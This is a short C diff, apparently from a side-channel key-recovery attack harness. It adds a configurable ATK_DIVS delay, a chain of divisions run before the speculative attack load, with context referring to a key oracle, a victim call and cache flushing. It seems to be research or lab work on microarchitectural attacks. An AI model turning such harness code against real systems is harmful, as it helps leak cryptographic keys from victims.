@@ -69,6 +69,9 @@ extern int oracle_report_key(uint64_t rk0, uint64_t rk1, int bytes,
 #ifndef COLD_KEY
 #define COLD_KEY  0                   /* 1: skip the warm-up victim call   */
 #endif
+#ifndef ATK_DIVS
+#define ATK_DIVS  12                  /* register-only marker delay        */
+#endif
 #define FLUSH_SZ  (64 * 1024)
 
 /* Distances measured with objdump (see RESULTS_step2.md):
@@ -131,19 +134,47 @@ delayed_atk_load(uint64_t tag)
 {
     uint64_t z = (tag | 1) & 0xffffff;
     asm volatile("" : "+r"(z));
+#if ATK_DIVS == 0
+    uint64_t x = 0;
+#else
     uint64_t x = z;
+#if ATK_DIVS >= 1
     x /= (z + 2);
+#endif
+#if ATK_DIVS >= 2
     x /= (z + 3);
+#endif
+#if ATK_DIVS >= 3
     x /= (z + 4);
+#endif
+#if ATK_DIVS >= 4
     x /= (z + 5);
+#endif
+#if ATK_DIVS >= 5
     x /= (z + 6);
+#endif
+#if ATK_DIVS >= 6
     x /= (z + 7);
+#endif
+#if ATK_DIVS >= 7
     x /= (z + 8);
+#endif
+#if ATK_DIVS >= 8
     x /= (z + 9);
+#endif
+#if ATK_DIVS >= 9
     x /= (z + 10);
+#endif
+#if ATK_DIVS >= 10
     x /= (z + 11);
+#endif
+#if ATK_DIVS >= 11
     x /= (z + 12);
+#endif
+#if ATK_DIVS >= 12
     x /= (z + 13);
+#endif
+#endif
     return atk_load(atk_buf, x);
 }
 
